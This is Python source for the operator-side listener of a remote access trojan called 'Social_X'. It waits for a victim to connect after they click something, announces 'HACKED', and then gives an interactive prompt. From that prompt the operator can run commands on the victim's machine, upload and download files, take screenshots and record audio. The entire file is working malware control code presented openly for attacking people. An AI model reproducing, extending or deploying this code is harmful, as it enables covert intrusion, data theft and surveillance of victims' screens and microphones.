import socket,json,base64,getpass
import time
import os
import subprocess
import threading
from multiprocessing import Process,Lock
from subprocess import Popen,PIPE
class Listener:
    def __init__(self,ip,port):
        colors = {'HEADER' : "\033[95m",
        'OKBLUE' : "\033[94m",
        'RED' : "\033[91m",
        'YELLOW' : "\033[93m",
        'GREEN' : "\033[92m",
        'LIGHTBLUE' : "\033[96m",
        'FAIL' : "\033[91m",
        'END' : "\033[0m",
        'BOLD' : "\033[1m",
        'UNDERLINE' : "\033[4m" }
        print colors["GREEN"]
        os.system("figlet Social_X -f PYTHON/larry3d.flf")
        print colors["OKBLUE"]
        print "------------------------------------------------------------------"
        print "                         By:Aziz Kaplan" 
        print  "                          Version:1.0" 
        print  "------------------------------------------------------------------"
        print colors["YELLOW"]
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+]Socialx-Project:Waiting For Incoming Connections..")
	print "[+]Connection Will Be Established After 3 Minutes Victim Clicks."
        print("[+]Socialx-Project:On Port:{} For Ip Address:{}".format(port,ip))
        self.connection,address=listener.accept()
        print("[+]Socialx-Project:HACKED"+str(address))
    
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)
    def reliable_receive(self):
        json_data=""
        while True:
            try:
                json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive()
    def write_file(self,path,content):
        
        with open(path,"wb") as file:
            content=content.encode("utf-8")
            file.write(base64.b64decode(content))
            return "[+]Socialx-Project:Download Successful"
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command=raw_input("[#]SOCIALX-PROJECT==>")
            command=command.split(" ")
            
            if command[0]=="upload":
                file_content=self.read_file(command[1])
                command.append(file_content)
            result=self.execute_remotely(command)
            if command[0]=="download":
                result=self.write_file(command[1],result)
            if command[0]=="screenshot":
                try:
                    os.chdir("Screenshots")
                except:
                    try:
                        os.chdir("../Screenshots")
                    except:
                        pass
                number=0
                
                
                output=subprocess.check_output("ls",shell=True)
                output=output.split("\n")
                
                for i in output:
                    if str(number) in i:
                        number+=1
                result=self.write_file(str(number)+".png",result)
                print("[+]Socialx-Project:Check Screenshots Folder Now!")
            if command[0]=="help":
                pass
            if command[0]=="voice_recorder" or command[0]=="voice_record":
                
                try:
                    os.chdir("Voice_Records")
                except:
                    try:
                        os.chdir("../Voice_Records")
                    except:
                        pass
                number=0
                output=subprocess.check_output("ls",shell=True)
                output=output.split("\n")
                for i in output:
                    if str(number) in i:
                        number+=1
                result=self.write_file(str(number)+".wav",result)
            
            print(result)
ip_adr=raw_input("[+]LHOST=")
port=raw_input("[+]PORT_NUMBER=")
os.system("clear")
l=Listener(str(ip_adr),int(port))
l.run()
